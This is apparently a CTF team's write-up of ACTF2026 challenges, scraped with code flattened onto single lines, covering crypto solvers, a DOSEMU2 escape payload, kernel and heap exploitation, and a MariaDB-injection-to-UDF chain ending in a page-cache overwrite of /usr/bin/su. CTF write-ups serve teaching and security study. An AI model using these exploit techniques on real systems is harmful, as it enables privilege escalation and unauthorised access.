# ACTF2026 WriteUp By F1ux

> 原文: https://www.ctfiot.com/307824.html
> ID: 307824

感谢队内每一位师傅的努力付出，本次 ACTF2026 我们拿到了第四的好成绩！！！*^_^*

F1ux，源于“Flux”之意，象征着不断流动的技术与永不停息的探索精神，作为一支新兴战队，F1ux仍在不断壮大与进化。

如果有任何加入、商务合作或者技术交流的意向，欢迎通过以下方式联系我们^u^：

f1ux_team@163.com

有兴趣的师傅可以关注官网，会同步更新哦：

https://f1uxteam.github.io/

Crypto

inverse pow

程序分析

数学转换

用 C helper 做 128-bit 定点扫描，速度足够快；

用Python Decimal高精度复核候选值。

1. jail 非预期读 flag

直接用：

eval环境没有禁用 builtins。

help('secret')会通过 pydoc 展示secret模块文档。

secret.py里有FLAG，pydoc 的DATA区会打印它。

#!.是注释，不影响 Python 表达式，只用于调整数取模结果。 该 payload 的整数为：

2. 低指数 RSA 广播恢复明文

服务端返回的是：

Pand√ra

题目给了一个 Sage 脚本和一个交互服务： 1.95.80.34 9999

核心代码如下：

FLAG = b"actf{redacted}"while(p:=random_prime(2**512))%4 != 3: continueq = random_prime(2**512)K = QuadraticField(-p,'w')R = RealField(2333)ΔΚ, Δq = -p, -p*q**2OK = K.maximal_order()Oq = K.order([1, (Δq+q*K.gen())/2])token = os.urandom(45)α = OK.ideal(int(token[:30].hex(),16)+ int(token[30:].hex(),16)*K.gen())a, b, c = list(α.quadratic_form())A, B = a, b*q%(2*a)ifB >= a: B -= 2*ah = Oq.ideal([A, (-B + q*K.gen())/2]).quadratic_form()ζ = list(h.reduced_form())[:2]; ζ[0] >>= 360λ = f"{R(-Δq).sqrt():.470f}".split('.')[1]ifbytes.fromhex(input(f"{ζ, λ}n[token]: ")) == token: print("^_^ >🚩", FLAG)

服务输出的是：([A >> 360, B], decimal_part_of_sqrt(p*q^2)) ，需要反推出那一轮的 45 字节token。
1. 从小数部分恢复N = p*q^2

2. 恢复完整二次型 [A, B, C]

ArrAnge in Asceding

1. 源码分析

附件中的 chal.py如下：

import tenseal.sealapi as sealapiimport tenseal as ts, random, base64 as b64FLAG ="actf{redacted}"ctx = ts.context_from(open("ctx.secret","rb").read())ctxdata = ctx.seal_context().dataBase = random.sample(range(512),128)Chaos = ts.ckks_vector(ctx, Base)print(b64.b64encode(Chaos.serialize()).decode())open("ct.bin",'wb').write(b64.b64decode(input("😶‍🌫️ :")))(Crystal:=sealapi.Ciphertext()).load(ctxdata,"ct.bin")decryptor = sealapi.Decryptor(ctxdata, ctx.secret_key().data)decryptor.decrypt(Crystal, answer:=sealapi.Plaintext())encoder = sealapi.CKKSEncoder(ctxdata)answer = list(encoder.decode_double(answer))[:
128]ifall(round(i) == sorted(Base).index(j)fori,jinzip(answer, Base)): print("^_^ >🚩", FLAG)

setup.py如下：

import tenseal as tsctx = ts.context( ts.SCHEME_TYPE.CKKS, 32768, coeff_mod_bit_sizes=[50]+[40]*12+[50])ctx.global_scale = 2**40secret_bytes = ctx.serialize(save_secret_key=True)public_bytes = ctx.serialize(save_secret_key=False)open("ctx.secret","wb").write(secret_bytes)open("ctx.public","wb").write(public_bytes)ctx.generate_galois_keys()ctx.galois_keys().data.save("galois.key")

服务端随机生成 128 个互不相同的整数：

Base = random.sample(range(512), 128)

然后把Base加密成 CKKS 向量发给客户端。客户端需要返回另一个密文，服务端解密后取前 128 个槽位，并检查：

round(answer[i]) == sorted(Base).index(Base[i])

也就是说，返回值不是排序后的数组，而是每个原始元素在升序数组中的 rank。例如Base[i]是第 0 小，则答案第i位为 0；是第 127 小，则答案第i位为127。

2. 可用条件

pubkey.zip中给出了：

ctx.public：不含 secret key 的 TenSEAL context；

galois.key：Galois key，用于 CKKS SIMD 旋转。

虽然没有私钥，但ctx.public中仍有 public key 和 relin key，因此可以完成：

加法；

密文乘密文；

relinearize；

rescale；

明文乘法；

旋转。

题目本质变成：在不知道明文Base的情况下，对加密向量同态计算每个元素的 rank。

pos：处理j > i的差值；

neg：处理j < i的差值。

核心构造：

Misc

Farthest2026

1. 环境确认

连接上去之后能看到一个C:>，文件系统是 DOSEMU2 里的 MFS 映射。通过type Dockerfile能看到比较关键的几行：

chmod u+s `whichcat`chown root:
root /flagchmod 0600 /flagunsetFLAGcd/home/dosexecrunuser -u dos -- /usr/local/bin/start-vnc-dosemuCOPY flag /flagCOPY Dockerfile /home/dos/.dosemu/drive_c/Dockerfile

所以目标很明确：DOS 里当前用户是dos，直接读不了/flag；但是宿主机里的cat被加了 SUID，能用/usr/bin/cat /flag读到 flag。问题变成了怎样从 DOSEMU 里的 DOS 环境执行宿主侧程序。

先试过几个显眼入口：

unix /usr/bin/cat /flagunix -s cat /flagelfexec X.SO

unix这条路被unix_exec白名单限制住了，/usr/bin/cat、/bin/sh之类都不放行。elfexec也不是直接可用的，在 comcom64 的 stubless build 里会报类似：

unsupported stub version 7elfexec failed

这个时候不要急着打unix，真正能用的点在 DOSEMU2 的 DJ64 loader。

2. 上传文件

VNC 只有键盘输入，直接传二进制很难受：copy con会吃控制字符，还会在行尾塞 CRLF。最后我先传了一个很小的 hex decoder 到 DOS 里，之后所有二进制都走：

copy con A.TXT<hex string>^Zg.com

g.com的逻辑是读A.TXT的十六进制文本，写出二进制文件X.SO。后面每次上传只要把目标文件转 hex，再跑g.com，最后ren X.SO R.ELF/ren X.SO R.COM即可。

我本地用的上传脚本核心如下，VNC 发键的部分就是普通 RFB keyboard event，没什么特别：

#!/usr/bin/env python3import argparseimport binasciiimport time
from farthest_slow_type import slow_text
from farthest_vnc import VNCap = argparse.ArgumentParser()ap.add_argument("host")ap.add_argument("file")ap.add_argument("--hex-name", default="A.TXT")ap.add_argument("--decoder", default="g.com")ap.add_argument("--line",type=int, default=64)ap.add_argument("--delay",type=float, default=0.003)args = ap.parse_args()hx = binascii.hexlify(open(args.file,"rb").read()).decode()lines = [hx[i:i + args.line]foriinrange(0, len(hx), args.line)]v = VNC(args.host)slow_text(v, f"clsndel {args.hex_name}ndel X.SOndel OUT.TXTncopy con {args.hex_name}n", args.delay)forlineinlines: slow_text(v, line +"n", args.delay)slow_text(v, f"x1an{args.decoder}ndir X.SOn", args.delay)time.sleep(2)v.close()

3. 找到 DJ64 loader 入口

DOSEMU2 有一个DOS_HELPER_ELFLOAD helper。官方的elfload.com本质上就是一个很短的 COM：

; R.COMbits 16org 100h mov sp, stack ; 缩小自己的内存块，否则后面 DPMI loader 可能拿不到连续内存 mov ah, 4ah mov bx, stack shr bx, 4 inc bx int 21h ; al=0x60 -> DOS_HELPER_ELFLOAD ; ah=1 -> ELFLOAD_PLUGIN_VERSION ; dx=5 -> DJSTUB_API_VER mov al, 60h mov ah, 01h mov dx, 0005h int 0e6h mov ah, 4ch int 21hstack:

对应机器码：

bc1b02b44abb1b02c1eb0443cd21b060b401ba0500cde6b44ccd21

这个 COM 文件命名成R.COM后，DOSEMU 的elf_thr()会自动把当前程序名的后缀替换成.ELF，也就是去打开同目录下的R.ELF。所以后面只要控制R.ELF的内容即可。

4. 构造伪 MZ stub

DJ64 stub loader 支持几种格式，其中有一段判断 MZ 头：

if(buf[0] =='M'&& buf[1] =='Z'&& buf[8] == 4 && buf[9] == 0) { stub_ver = buf[0x3b]; memcpy(&offs, &buf[0x3c], sizeof(offs)); ...}

如果设置STFLG1_NO32PL，loader 不会把文件当成普通 32 位 ELF 主程序，而是把e_lfanew指向的位置当作用户 payload。这样R.ELF可以长这样：

0x00 - 0x3f: fake MZ header0x40 - end : 64-bit ELF shared object

关键字段：

MZ header: [0x00:
0x02] ="MZ" [0x08:
0x0a] = 0x0004 [0x1c:
0x20] = payload size [0x38] = 0x86 [0x3b] = 7 [0x3c:
0x40] = 0x40

这里0x86很关键：

0x80 = STFLG1_NO32PL0x02 = SHM_EXCL0x04 = SHM_NEW_NS

一开始只用了0x82，payload 会落到普通 shm 上，dlopen失败。加上 SHM_NEW_NS 后，DOSEMU 会在自己的临时目录里创建 payload 文件，权限和挂载状态都合适，DJ64 能正常dlopen。

生成R.ELF的脚本：

#!/usr/bin/env python3
from pathlib import Pathpayload = Path("payload.so").read_bytes()h = bytearray(0x40)h[0:2] = b"MZ"h[8:10] = (4).to_bytes(2,"little")h[0x1c:
0x20] = len(payload).to_bytes(4,"little")h[0x38] = 0x86 # NO32PL | SHM_EXCL | SHM_NEW_NSh[0x3b] = 7 # current dj64 stub versionh[0x3c:
0x40] = (0x40).to_bytes(4,"little")Path("R.ELF").write_bytes(h + payload)print("R.ELF size =", len(h) + len(payload))

5. 宿主侧 payload

R.ELF里真正的 payload 是一个 x86_64 shared object。DJ64 打开库时需要几个符号：

maindj64init_oncedj64initdj64done

把读 flag 的动作放在dj64init_once()里。因为 Dockerfile 已经给/usr/bin/cat加了 SUID，所以这里直接 fork + execveusr/bin/cat /flag，把 stdout/stderr 重定向到 DOS C 盘对应的宿主路径：

/home/dos/.dosemu/drive_c/OUT.TXT

完整 payload：

typedef unsigned long size_t;
struct dj64_api;
struct elf_ops;typedef int dj64cdispatch_t(int handle, int libid, int fn, unsigned esi, unsigned char *sp);
static long sc0(long n) { long r; __asm__ volatile("syscall":"=a"(r) :"a"(n) :"rcx","r11","memory"); returnr;}static long sc1(long n, long a) { long r; __asm__ volatile("syscall":"=a"(r) :"a"(n),"D"(a) :"rcx","r11","memory"); returnr;}static long sc2(long n, long a, long b) { long r; __asm__ volatile("syscall":"=a"(r) :"a"(n),"D"(a),"S"(b) :"rcx","r11","memory"); returnr;}static long sc3(long n, long a, long b, long c) { long r; __asm__ volatile("syscall":"=a"(r) :"a"(n),"D"(a),"S"(b),"d"(c) :"rcx","r11","memory"); returnr;}static long sc4(long n, long a, long b, long c, long d) { long r; register long r10 __asm__("r10") = d; __asm__ volatile("syscall":"=a"(r) :"a"(n),"D"(a),"S"(b),"d"(c),"r"(r10) :"rcx","r11","memory"); returnr;}static void run_cat(void) { static char out[] ="/home/dos/.dosemu/drive_c/OUT.TXT"; static char cat[] ="/usr/bin/cat"; static char flag[] ="/flag"; static char fail[] ="exec failedn"; static char *argv[] = {cat, flag, 0}; static char *envp[] = {0}; long pid = sc0(57); // fork if(pid == 0) { long fd = sc3(2, (long)out, 1 | 64 | 512, 0666); // open O_WRONLY|O_CREAT|O_TRUNC if(fd >= 0) { sc2(33, fd, 1); // dup2(fd, stdout) sc2(33, fd, 2); // dup2(fd, stderr) sc1(3, fd); // close(fd) } sc3(59, (long)cat, (long)argv, (long)envp); // execve sc3(1, 1, (long)fail, sizeof(fail) - 1); sc1(60, 1); }elseif(pid > 0) { int status = 0; sc4(61, pid, (long)&status, 0, 0); // wait4 }}static int dummy_dispatch(int handle, int libid, int fn, unsigned esi, unsigned char *sp) { (void)handle; (void)libid; (void)fn; (void)esi; (void)sp; return0;}static dj64cdispatch_t *dispatchers[] = { dummy_dispatch, dummy_dispatch};
void _binary_tmp_o_elf_start(void) {}void _binary_tmp_o_elf_end(void) {}int main(int argc, char **argv) { (void)argc; (void)argv; return0;}int dj64init_once(const struct dj64_api *api, int api_ver) { (void)api; (void)api_ver; run_cat(); return0;}dj64cdispatch_t **dj64init(int handle, const struct elf_ops *ops, void *m, int full) { (void)handle; (void)ops; (void)m; (void)full; returndispatchers;}void dj64done(int handle) { (void)handle;}

6. 利用流程

本地生成两个文件：

# 1. 生成 64 位 shared objectclang -target x86_64-linux-gnu -nostdlib -shared -fuse-ld=lld -fPIC -fno-asynchronous-unwind-tables -fno-unwind-tables -Wl,--hash-style=sysv,--build-id=none,-s payload.c -o payload.so
# 2. 生成 fake MZ + payload 的 R.ELFpython3 make_relf.py
# 3. 生成 R.COMpython3 - <<'PY'from pathlib import PathPath("R.COM").write_bytes(bytes.fromhex( "bc1b02b44abb1b02c1eb0443cd21" "b060b401ba0500cde6b44ccd21"))PY

传到 DOS 环境：

# 上传 R.ELF，目标侧会生成 X.SOpython3 upload_hex.py <host> R.ELF --decoder g.com
# DOS 里改名ren X.SO R.ELF
# 上传 R.COM，目标侧会生成 X.SOpython3 upload_hex.py <host> R.COM --decoder g.com
# DOS 里改名并执行ren X.SO R.COMR.COMtypeOUT.TXT

执行后OUT.TXT内容：

ACTF{ba6k_t2_th3_ag1s_wIth0uT_a9ents_KeHo7P1oYx}

ZJUAM Just Uses Awful Math

题目分析

题目给了一个登录过程的抓包。先看流量结构，可以发现整个过程只有 21 个包，而且都是明文 HTTP，请求顺序很清楚：

访问/cas/login

访问/cas/v2/getPubKey

向/cas/login提交表单

用户输入的密码会先被倒序

倒序后的字符串会用前端 RSA 公钥加密

加密结果直接作为 password 字段提交

第一段是系统口令

第二段是 Team token

guest和目标用户都会先经过一层 Team token 校验

公钥登录也会进入这层校验，只要 token 正确，登录就能成功

随后翻目标用户留下的操作痕迹，可以拼出一条很关键的信任链：

他曾经登录过oldgw的root

他把oldgw的root公钥加入了自己的公钥白名单

他再从 bastion 登录git-01–git-01上还保留了一把继续访问backup-01的私钥

第三段 flag 最终会落到ai-gateway-01提供的接口上

release[...]保证路径前半部分能落在已有对象agentProfile.scopes.release上。

[?(...)]触发 JSONPath filter expression。

({proto:"".toString})["constructor"]取到Function构造器。

Function("JS_CODE")()执行 JS 代码。

代码执行后即使 YAML 更新失败也不影响结果，副作用已经完成，所以接口返回的 job 状态可以是failed。

Pwn

ACPU

run.py会：

把提交的 base64 代码写入 /tmp/rom_file.mem 的 0x100 word 位置；

把 flag.txt 写成 /tmp/flag.mem；

执行 Simulation 并回显寄存器和 took … cycles。

非法读取 secret word：

后续依赖指令虽然也会变成 bad path，但仍会吃到转发值：

再探测候选字符c的 cache line：

AGPU

漏洞点

mali_kbase.ko里有 CTF 后门 ioctl：

#defineKBASE_IOCTL_VERSION_CHECK 0xC0048034#defineKBASE_IOCTL_SET_FLAGS 0x40048001#defineKBASE_IOCTL_CTF_WRITE4 0x40108200struct ctf_write4 { uint64_t addr; uint32_t value; uint32_t zero;};

KBASE_IOCTL_CTF_WRITE4只能用一次，但会做裸写：

*(uint32_t *)addr = value;

所以原语是：一次任意内核地址 4 字节写。

失败思路

最开始尝试写static_usermodehelper_path：

static_usermodehelper_path = 0xffff000000668208

单次写只能写 4 字节，写相对路径如"x   "不会触发有效 usermodehelper；同时该后门有 one-shot 限制，不能稳定多次写完整绝对路径。直接 patch kernel text 也会因为STRICT_KERNEL_RWX/ direct-map RO 失败。

利用思路

不需要泄漏内核基址，直接打cred：

/flag是root:
root 0400

generic_permission()检查文件权限时会用current->cred->fsuid

struct cred中 uid/gid 字段为连续 8 个kuid/kgid

本地确认：

父进程 fork 500 个子进程。

子进程execv("/home/pwn/exploit", ...)，获得独立cred。

子进程阻塞等父进程关闭 pipe。

父进程调用 Mali ioctl：

父进程关闭 pipe，唤醒所有子进程。

被命中的子进程fsuid == 0，成功读取/flag。

EXP：

badgate– ELF x86-64 二进制文件 (PIE, Full RELRO, Canary, NX, FORTIFY 全开)

Dockerfile– Ubuntu 24.04, xinetd 服务, chroot 到/home/ctf

http.example.lua– 示例 Lua handler 脚本

gateway_server– xinetd 配置, 端口 9999

连接到 9999 端口, xinetd fork 子进程 chroot 运行badgate

从 stdin 读取 Lua 脚本 (以仅含EOF的行结束)

编译加载脚本, 在随机端口 (10000~12000) 监听

客户端连接监听端口, 发送数据作为pkt, 调用gateway.run(handler)注册的处理函数

gateway.run(handler_fn(conn, pkt))

conn:
send(data),conn:
close(),conn:
peer(),conn:
sockname()

pkt:
len(),pkt:
tostring(),pkt:
write(off, data),pkt:
view(off, len) -> pkt

loadfile('/flag')在 Lua 中可用, 它会读取文件内容到堆上的内部缓冲区

当conn:
close()释放了 pkt 的 4096 字节数据缓冲区后,loadfile分配的内部读取缓冲区可能复用同一块堆内存

通过之前保存的 pkt view 读取这块内存, 就能读到 flag 文件内容

连接 1: 触发 UAF, 用loadfile('/flag')将 flag 读入堆, 通过 view 读取内容, 存入全局变量

连接 2: 通过conn:
send()将全局变量中的 flag 内容发送回来

MCU：CH32V003F4P6

EEPROM：AT24C64

I2C：SDA -> PC1，SCL -> PC2

UART：PD5/PD6

EEPROM A0/A1/A2 接地，所以 7-bit 地址是0x50

连接远程，提交 token 和 PoW。

利用格式串把0x20000000patch 成c.j 0x20000068。

发送 63 个 NUL，让 128 字节 DMA ring 对齐。

发送x00x00 + stage1 + n，把 stage1 放到0x20000068。

发送exit，固件执行：

stage1 将 loader 复制到安全 RAM，再读取 stage2。

stage2 初始化 I2C1，读取 AT24C64 前 128 字节并通过 UART 输出。

输出里直接得到 flag。

F4是输入 flag 的位置，默认内容是ACTF{flag}。

I列是一大段十六进制，看起来像指令区。

J列保存寄存器状态。

K列是初始化内存，L列是运行时内存。

C列负责取指、译码、执行。

F10会把输出字符拼起来。

先把明文块异或两个 16 字节 key。

进行 7 轮变换。

每轮有 S-box、ShiftRows、前 6 轮有 MixColumns。

MixColumns 使用的 GF 多项式不是 AES 常见的 0x1b，而是 0x1d。

RoundKey 来自已经被第三段循环改过的 expand 32-byte k。

真正的校验逻辑不直接明文放在.text，而是放在.rdata中一段加密 VM bytecode；

CUDA kernel 名为Z16npu_cycle_kernelPhPjjPyS0，里面解释执行这段 bytecode，所以题目名叫 VirtualNPU。

flagchecker

先解压查看文件类型：

$ unzip flagchecker.zip$ file flagcheckerflagchecker: ELF 64-bit LSB executable, LoongArch, version 1 (SYSV), statically linked, stripped

几个比较明显的信息：

$ strings -a flagchecker | grep -E'ACTF|Wrong|Verifier|CT77|JGqVVFpm|SHA|AES|flag'flagCT77IKGJ*main.JGqVVFpmWrong!AES-CBCJGqVVFpmVerifierSHA2-256main.(*JGqVVFpm).E3XDFQIVmain.(*JGqVVFpm).NAT7NCZZmain.(*JGqVVFpm).ELK4X6I7...

文件是 LoongArch64 的静态 Go 程序，并且被 stripped。虽然符号表没了，但 Go 程序通常还能从pclntab和字符串区里捞出函数名。这里能看到大量类似main.(*JGqVVFpm).XXXXXXX的方法名，基本可以判断程序把主要校验拆成了一堆小函数。

另外字符串里还能看到一些加密相关文本，比如 AES-CBC、SHA2-256。这些在一开始比较容易误导方向，后面确认核心校验并不是直接做 AES/SHA 对比。

用 IDA/Ghidra 直接打开时，架构是 LoongArch64，函数名也比较乱。比较有效的切入点是下面几个字符串：

Wrong!

Verifier

CT77IKGJ

*main.JGqVVFpm

从前到后，初始 state0xa5a5a5a5。

从后到前，初始 state0x5a5a5a5a。

Web

AAA’26

通过 reviewer profile 导入逻辑中的 Mongo 查询注入泄漏 reviewer invite code。

使用 invite code 认领 reviewer 身份。

通过 reviewer filter 中的 vm2 表达式执行点泄漏 Node.js Buffer slab 内存。

从内存中恢复 JWT secret。

伪造 admin JWT。

创建论文并用 admin 权限把论文状态改成 Accepted。

上传 camera-ready 文件，利用 ImageMagick/Ghostscript 处理 SVG 时的 text:/flag 读取文件。

服务

端口

用户

端口

ticketing_api

5000

rail

车票预订、订单管理

waitlist_push

5001

rail

候补队列、WebSocket 登机

sso_gateway

5002

rail

SSO 身份认证

station_portal

5003

rail

车站服务台（票据调整、公告）

pricing_sampler

5004

rail

票价采样、渲染任务

enterprise_gateway

5005

rail

企业网关（收据准备）

receipt_signer

5006

rail

收据签名

settlement_scheduler

5007

rail

结算调度

station_import

5008

rail

数据导入适配器

depot_layout

5009

settle

布局预览/打印桥接

print_spooler

–

settle

打印后台（执行程序）

edge_gateway

5010

rail

API 网关（路由）

rail:
interline:
lane:
HGH→ 签名线路路由

rail:
board:
profile:
HGH→ 登机配置（topic、transport、ack）

rail:
partner:
jwks:
HGH→ JWK 密钥（kid=POL-HGH-TRUSTED, key=e94c0a8d-12307-hgh-trusted）

waitlist_entries.sampled = 1

station_profiles.batch_open = 1, renderer_profile = 'folio-grid-27', signer_route = 'delta-window-27'

创建tariff_exception_claims记录

boarding.hello→ 确认通道

boarding.bind(topic=seat-consist, trainId=G7608) → 绑定订阅

boarding.confirm(orderId, stationCode=HGH) → 确认登机

加载全部上下文（订单、收据、信任、候补、布局等）

验证所有条件（13 项检查）

渲染模板 →{{reconciliation.receipt}}触发resolve_cell("receipt")

单元格类型为service-device→ 调用bridge_preview("PR-HGH-042", ...)

Depot Layout 创建签名 ticket，推入打印队列

Print Spooler 验证 ticket 签名、codec、acceptedPrograms

执行posix_spawn("/usr/bin/base64", "/flag")

入口/跳到旧下载站/view?p=/，页面提示新站在/new/#/_/test。

新站是go-drive，后台默认口令可用：

后台添加一个fsdrive，路径设为../../../，命名为esc，即可从 go-drive 视角访问容器根目录，例如：

/app/config.yml中的 thumbnail shell handler 会对特定后缀调用：

CVE-2026-31431是 AF_ALG + splice 的 page-cache 覆盖漏洞。这里选择覆盖可读且会被 root cron 定时执行的脚本：

触发缩略图后，/tmp/EXP_LOG验证 patch 成功：

等待 cron 在:
09或:
39执行sessionclean，随后通过 go-drive 的/zip接口读取：

通过/calc的 MariaDB 表达式注入确认数据库执行能力，并验证多语句和EXECUTE IMMEDIATE可用。

创建rf / lenf / hx辅助函数，拿到稳定的文本读文件和二进制分块读取能力。

利用SELECT 0x... INTO DUMPFILE向 MySQLplugin_dir上传 UDF，共享库注册成sysx，获得mysql用户命令执行。

枚举容器后确认 Web 进程/usr/local/bin/99820119_myapp由 root 运行，而/flag为600 root:
root，单纯 UDF 无法直接读 flag。

逆向 Go 二进制确认/draw虽然内置危险模板函数run，但在当前参数校验下不可达，是一条干扰路线。

利用内核Copy Fail（CVE-2026-31431）实现 4 字节页缓存写原语，本地编译最小工具cfw。

上传cfw后逐 4 字节覆写/usr/bin/su的前 160 字节，使其在页缓存中变成最小setuid(0)+/bin/sh ELF stub。

执行printf 'idncat /flagn' | /usr/bin/su，拿到 root shell 输出并读出最终 flag。

/calc

/draw

先打/calc，确认是否能转成数据库执行。

同时观察/draw，看看是否存在 Go 模板注入或内置后门。/calcMariaDB 表达式注入/calc是一个 POST 表单，参数名为expression。页面提示 “不要包含 SQL keywords”，但这种文案在题里通常意味着后端直接拼接了 SQL 表达式。

database()->testdb

user()->root@localhost

这就说明/calc不是本地算式解析器，而是真的把输入交给了 MariaDB 执行，而且数据库连接权限很高，直接就是root@localhost。

rf(p)：直接读取文本文件。

lenf(p)：拿文件长度。

hx(p,o,l)：把任意文件按块切出来并十六进制回传。

可执行多语句。

可动态执行十六进制包装的 SQL。

可稳定读取文本文件。

可按块导出二进制。

/etc/passwd可读。

/flag存在，但直接读不到。 后续通过命令执行和ls -l可以确认：

/flag权限为600 root:
root

必须拿到 root 权限才能读

上传共享库到/usr/lib/mysql/plugin/

CREATE FUNCTION ... SONAME ...

通过 UDF 执行系统命令

Web 主进程是/usr/local/bin/99820119_myapp

Web 由 root 运行

数据库由mysql运行

/calc提供数据库执行入口

UDF 提供mysql命令执行

真正能读/flag的是 root 权限的 Web 进程

myapp/internal/challenge.Run

myapp/internal/challenge.calcHandler

myapp/internal/challenge.drawHandler

myapp/internal/challenge.parseTemplateVars

myapp/internal/challenge.validateTemplateVars

myapp/internal/challenge.parseTemplateString

myapp/internal/challenge.commandHandler

myapp/internal/challenge.runCommand

/

/calc

/draw

draw_number

strrot

run其中run最危险，它最终会调用：

<

/>

'

;

字面量和函数参数都依赖引号

函数调用格式里需要;

run本身还是 unsafe-only 分支

/draw的模板系统确实危险。

但当前输入路径上，真正可控的 value 会先经过严格校验。

在现有约束下，run虽然存在，但实际上不可达。

mysql身份下有命令执行

/flag只能 root 读

/draw逻辑里没有稳定可达的 root 执行链

直接改/etc/pam.d/su

直接大块覆写/usr/bin/su

本地写一个只负责“4 字节页缓存写”的最小工具。

上传这个工具到容器。

用它逐 4 字节覆写 /usr/bin/su 的前 160 字节。

覆写内容不是普通文本，而是一个最小 ELF stub，功能只有 setuid(0) 和 execve(“/bin/sh”, …)

输入<目标文件> <偏移> <4字节数据>

借助AF_ALG + splice()把这 4 字节写到目标文件对应的页缓存里

setuid(0)

execve("/bin/sh", ...)

退出

libmse9.so

cfw


```
m := rand.Int(1, 99999999)fmt.Printf("m = %dn", m)fmt.Print("n = ")n, _ := strconv.Atoi(readline())x := new(big.Int).Exp(big.NewInt(2), big.NewInt(int64(n)), nil)ifstrings.HasPrefix(x.String(), strconv.Itoa(m)) { fmt.Println("Verified")}else{ fmt.Println("Failed")}
ROUND 1 / 8m = ...n =
str(2^n).startswith(str(m))
log10(m) - (d - 1) <= frac(n * log10(2)) < log10(m + 1) - (d - 1)
lo - eps <= frac < hi
#!/usr/bin/env python3import argparseimport osimport reimport socketimport subprocessimport tempfile
from decimal import ROUND_CEILING, ROUND_FLOOR, ROUND_HALF_EVEN, Decimal, getcontext
from pathlib import PathHOST ="1.95.44.158"PORT = 11314
class RateLimitError(RuntimeError): passSEARCH_C = r"""#include<stdint.h>#include<stdio.h>#include<stdlib.h>#include<string.h>static __uint128_t parse_u128_hex(const char *s) { __uint128_t x = 0; for (; *s; s++) { unsigned v; if (*s >= '0' && *s <= '9') v = (unsigned)(*s - '0'); else if (*s >= 'a' && *s <= 'f') v = (unsigned)(*s - 'a' + 10); else if (*s >= 'A' && *s <= 'F') v = (unsigned)(*s - 'A' + 10); else continue; x = (x << 4) | v; } return x;}int main(int argc, char **argv) { if (argc != 8) { fprintf(stderr, "usage: %s <alpha_hex> <lo_hex> <hi_hex|mod> <digits> <start> <start_intpart> <limit>n", argv[0]); return 2; } __uint128_t alpha = parse_u128_hex(argv[1]); __uint128_t lo = parse_u128_hex(argv[2]); int hi_is_mod = strcmp(argv[3], "mod") == 0; __uint128_t hi = hi_is_mod ? 0 : parse_u128_hex(argv[3]); uint64_t digits = strtoull(argv[4], NULL, 10); uint64_t start = strtoull(argv[5], NULL, 10); uint64_t intpart = strtoull(argv[6], NULL, 10); uint64_t limit = strtoull(argv[7], NULL, 10); __uint128_t f = alpha * ((__uint128_t)start); for (uint64_t n = start; n <= limit; n++) { if (intpart + 1 >= digits && f >= lo && (hi_is_mod || f < hi)) { printf("%llun", (unsigned long long)n); return 0; } __uint128_t old = f; f += alpha; if (f < old) { intpart++; } } return 1;}"""def build_searcher() -> Path: cache = Path(tempfile.gettempdir()) /"inverse_pow_prefix_search" src = cache.with_suffix(".c") ifcache.exists() and src.exists() and src.read_text() == SEARCH_C: returncache src.write_text(SEARCH_C) subprocess.run( ["cc","-O3", str(src),"-lm","-o", str(cache)], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, ) returncache
def verify_prefix(m: int, n: int) -> bool: getcontext().prec = 120 alpha = Decimal(2).log10() d = len(str(m)) frac = (Decimal(n) * alpha) % 1 lo = Decimal(m).log10() - (d - 1) hi = Decimal(m + 1).log10() - (d - 1) digits = int((Decimal(n) * alpha).to_integral_value(rounding="ROUND_FLOOR")) + 1 eps = Decimal(10) ** -60 returndigits >= d and lo - eps <= frac < hi
def fixed_params(m: int): getcontext().prec = 140 bits = 128 mod_int = 1 << bits mod_dec = Decimal(mod_int) alpha = Decimal(2).log10() d = len(str(m)) lo_dec = Decimal(m).log10() - (d - 1) hi_dec = Decimal(m + 1).log10() - (d - 1) margin = 1 << 34 alpha_i = int((alpha * mod_dec).to_integral_value(rounding=ROUND_HALF_EVEN)) lo_i = int((lo_dec * mod_dec).to_integral_value(rounding=ROUND_CEILING)) hi_i = int((hi_dec * mod_dec).to_integral_value(rounding=ROUND_CEILING)) lo_i = max(0, lo_i - margin) hi_i = min(mod_int, hi_i + margin) returnd, alpha, f"{alpha_i:
032x}", f"{lo_i:
032x}","mod"ifhi_i == mod_intelsef"{hi_i:
032x}"def find_exponent(m: int,limit: int) -> int: searcher = build_searcher() d, alpha, alpha_hex, lo_hex, hi_hex = fixed_params(m) start = 0 whilestart <=limit: start_intpart = int((Decimal(start) * alpha).to_integral_value(rounding=ROUND_FLOOR)) proc = subprocess.run( [str(searcher), alpha_hex, lo_hex, hi_hex, str(d), str(start), str(start_intpart), str(limit)], check=False, text=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, ) ifproc.returncode != 0 or not proc.stdout.strip(): raise RuntimeError(f"no exponent found up to {limit}") n = int(proc.stdout.strip().splitlines()[0]) ifverify_prefix(m, n): returnn start = n + 1 raise RuntimeError(f"no verified exponent found up to {limit}")def recv_until(sock: socket.socket, marker: bytes) -> bytes: data = bytearray() whilemarker notindata: chunk = sock.recv(4096) ifnot chunk: break data.extend(chunk) returnbytes(data)def solve_remote(team: str, token: str,limit: int, rounds: int, host: str = HOST, port: int = PORT) -> bytes: with socket.create_connection((host, port), timeout=15) as sock: sock.settimeout(75) transcript = bytearray() transcript.extend(recv_until(sock, b"Team:")) sock.sendall(team.encode() + b"n") transcript.extend(recv_until(sock, b"Token:")) sock.sendall(token.encode() + b"n") forround_idxinrange(1, rounds + 1): transcript.extend(recv_until(sock, b"n = ")) ms = re.findall(rb"m = (d+)", transcript) iflen(ms) < round_idx: text = transcript.decode(errors="replace") if"Rate limit exceeded"intext: raise RateLimitError(text) raise RuntimeError(text) m = int(ms[-1]) n = find_exponent(m,limit) print(f"[+] round {round_idx}/{rounds}: m = {m}, n = {n}") sock.sendall(str(n).encode() + b"n") whileTrue: try: chunk = sock.recv(4096) 
except socket.timeout: break ifnot chunk: break transcript.extend(chunk) returnbytes(transcript)def main() -> None: parser = argparse.ArgumentParser(description="Solve inverse_pow remote challenge.") parser.add_argument("--team", default=os.getenv("CTF_TEAM"),help="team name") parser.add_argument("--token", default=os.getenv("CTF_TOKEN"),help="team token") parser.add_argument("--host", default=HOST) parser.add_argument("--port",type=int, default=PORT) parser.add_argument("--limit",type=int, default=2_000_000_000) parser.add_argument("--rounds",type=int, default=8) args = parser.parse_args() ifnot args.team or not args.token: raise SystemExit("pass --team/--token or set CTF_TEAM/CTF_TOKEN") try: out = solve_remote(args.team, args.token, args.limit, args.rounds, args.host, args.port) 
